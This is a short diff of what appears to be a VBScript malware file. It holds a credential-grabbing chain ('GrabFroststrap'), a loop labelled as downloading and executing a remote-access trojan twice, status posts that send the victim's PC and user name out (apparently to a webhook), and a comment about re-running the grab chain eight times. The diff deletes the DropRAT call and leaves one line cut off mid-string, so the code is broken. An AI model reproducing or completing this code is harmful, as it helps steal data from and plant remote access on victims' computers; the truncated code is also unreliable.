@@ -29,9 +29,7 @@ Call GrabFroststrap
 ' --- Download & Execute RAT 2 Times ---
 Dim downloadAttempt
 For downloadAttempt = 1 To 2
-    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
-    Call DropRAT
-    If downloadAttempt < 2 Then Call SleepMinutes(2)
+    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " |
 Next
 
 ' --- Re-run grab chain 8x (every 10 min) ---
